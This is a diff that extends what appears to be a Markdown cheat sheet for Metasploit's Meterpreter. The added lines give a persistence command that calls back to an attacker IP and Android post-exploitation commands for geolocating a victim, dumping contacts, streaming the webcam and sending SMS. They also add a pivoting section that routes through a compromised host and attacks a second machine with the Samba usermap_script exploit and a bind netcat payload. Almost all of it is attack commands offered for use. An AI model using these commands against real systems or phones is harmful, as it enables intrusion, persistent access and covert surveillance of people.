@@ -82,6 +82,8 @@
   - ```migrate 596```
     - 596 is PID of *service.exe* or *explorer.exe* - DLL Hijack for persistant
 
+## Persistance
+- ```run persistence -U -i 20 -p 80 -r 10.20.14.203```
 
 ## msfvenom (Android)
 - Create malware
@@ -97,18 +99,35 @@
 - Exploit
   - ```sessions -l```
   - ```sessions -i 1```
+  - ```geolocate```
   - ```dump_sms```
   - ```dump_calllog```
+  - ```dump_contacts```
   - ```record_mic -d 15```
   - ```Webcam_snap```
   - ```webcam_snap -h```
-  - ```webcam_stream```
+  - ```webcam_list```
+  - ```webcam_stream 2```
+  - ```send_sms -h```
   - ```app_list```
     - show mobile app's 
   - ```app_run```
     - run one of above app 
   - ```shell```
-    - open mobile shell  
+    - open mobile shell (convert meterpreter shell to os shell)
      
+     
+## Pivot
+- Find a network interface with a different address from current subnet with ```ifconfig```
+- Create a route between hacker and new victim
+  - ```use post/windows/manage/autoroute```
+  - ```set SESSION 1
+  - ```set SUBNET 10.20.15.0```
+  - ```exploit```
+- Connect to new victim
+  - ```use exploit/multi/samba/usermap_script```
+  - ```set RHOST 10.20.15.4```
+  - ```set PAYLOAD cmd/unix/bind_netcat```
+  - ```exploit```
 
 
